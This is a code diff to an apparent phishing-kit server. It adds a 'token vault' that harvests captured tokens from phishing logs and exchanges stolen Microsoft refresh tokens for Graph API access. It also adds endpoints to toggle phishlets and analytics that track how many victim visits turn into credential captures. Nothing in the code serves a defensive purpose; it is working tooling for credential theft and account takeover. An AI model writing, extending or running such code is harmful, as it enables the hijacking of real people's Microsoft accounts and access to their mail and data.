@@ -391,6 +391,98 @@ app.post('/api/prt/exchange', async (req, res) => {
 });
 
 // =============================================
+// 🏛️ TOKEN VAULT API
+// =============================================
+
+const TokenVault = require('./token_vault.js');
+const vault = new TokenVault(LOG_DIR, ENCRYPTION_KEY);
+
+// Scan logs and update vault
+app.post('/api/vault/scan', (req, res) => {
+    try {
+        const tokens = vault.scanLogs();
+        res.json({ success: true, count: tokens.length });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get all tokens
+app.get('/api/vault/tokens', (req, res) => {
+    try {
+        res.json({ success: true, tokens: vault.tokens });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get tokens grouped by user
+app.get('/api/vault/users', (req, res) => {
+    try {
+        const users = vault.getTokensByUser();
+        res.json({ success: true, users });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get vault statistics
+app.get('/api/vault/stats', (req, res) => {
+    try {
+        const stats = vault.getStats();
+        res.json({ success: true, stats });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Health check all tokens
+app.post('/api/vault/healthcheck', async (req, res) => {
+    try {
+        const results = await vault.healthCheckAll();
+        res.json({ success: true, results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Exchange token from vault
+app.post('/api/vault/exchange', async (req, res) => {
+    const { tokenId, tokenValue } = req.body;
+    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
+
+    try {
+        const axios = require('axios');
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                refresh_token: tokenValue,
+                grant_type: 'refresh_token',
+                scope: 'https://graph.microsoft.com/.default offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        
+        // Update token status if found
+        if (tokenId) {
+            const token = vault.tokens.find(t => t.value === tokenValue);
+            if (token) {
+                token.status = 'valid';
+                token.lastExchanged = new Date().toISOString();
+                vault.save();
+            }
+        }
+        
+        res.json({ success: true, data: response.data });
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
+    }
+});
+
+// =============================================
 // 🕵️ GRAPH API RECON ENDPOINT
 // =============================================
 app.post('/api/recon', async (req, res) => {
@@ -626,6 +718,157 @@ app.get('/api/visits/stats', (req, res) => {
             uniqueIPs: uniqueIPs,
             today: todayVisits.length,
             week: weekVisits.length
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// =============================================
+// 🎭 PHISHLET API
+// =============================================
+
+app.get('/api/phishlets', (req, res) => {
+    try {
+        const phishlets = require('./phishlets.json');
+        res.json({ success: true, phishlets });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/phishlets/toggle', (req, res) => {
+    const { id, enabled } = req.body;
+    try {
+        const phishlets = require('./phishlets.json');
+        if (phishlets[id]) {
+            phishlets[id].enabled = enabled;
+            fs.writeFileSync(path.join(__dirname, 'phishlets.json'), JSON.stringify(phishlets, null, 2));
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ error: 'Phishlet not found' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// =============================================
+// 📊 CAMPAIGN ANALYTICS API
+// =============================================
+
+app.get('/api/analytics', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        const LOG_DIR = path.join(__dirname, 'phishing_logs');
+        
+        let visits = [];
+        let captures = [];
+        
+        // Load visits
+        if (fs.existsSync(VISITS_LOG_FILE)) {
+            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            visits = lines.map(line => JSON.parse(line));
+        }
+        
+        // Get captures from logs
+        const logFiles = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
+        captures = logFiles.map(f => {
+            const stat = fs.statSync(path.join(LOG_DIR, f));
+            return {
+                file: f,
+                modified: stat.mtime,
+                size: stat.size
+            };
+        });
+        
+        // Calculate analytics
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+        
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+        
+        const todayCaptures = captures.filter(c => c.modified >= today);
+        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+        
+        // Conversion rates
+        const conversionRate = {
+            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+        };
+        
+        // Daily capture data for charts
+        const dailyCaptures = {};
+        const dailyVisits = {};
+        for (let i = 6; i >= 0; i--) {
+            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+            const key = d.toDateString();
+            dailyCaptures[key] = 0;
+            dailyVisits[key] = 0;
+        }
+        
+        captures.forEach(c => {
+            const key = new Date(c.modified).toDateString();
+            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+        });
+        
+        visits.forEach(v => {
+            const key = new Date(v.timestamp).toDateString();
+            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+        });
+        
+        // Top target domains
+        const domains = {};
+        visits.forEach(v => {
+            const url = v.url || '';
+            const match = url.match(/https?:\/\/([^\/]+)/);
+            if (match) {
+                const domain = match[1];
+                domains[domain] = (domains[domain] || 0) + 1;
+            }
+        });
+        const topDomains = Object.entries(domains)
+            .sort((a, b) => b[1] - a[1])
+            .slice(0, 5)
+            .map(([domain, count]) => ({ domain, count }));
+        
+        // Unique IPs
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        
+        res.json({
+            success: true,
+            analytics: {
+                visits: {
+                    total: visits.length,
+                    today: todayVisits.length,
+                    week: weekVisits.length,
+                    month: monthVisits.length
+                },
+                captures: {
+                    total: captures.length,
+                    today: todayCaptures.length,
+                    week: weekCaptures.length,
+                    month: monthCaptures.length
+                },
+                conversionRate,
+                uniqueIPs,
+                dailyCaptures,
+                dailyVisits,
+                topDomains,
+                captureTimeline: captures.map(c => ({
+                    date: c.modified,
+                    file: c.file,
+                    size: c.size
+                }))
+            }
         });
     } catch (err) {
         res.status(500).json({ error: err.message });
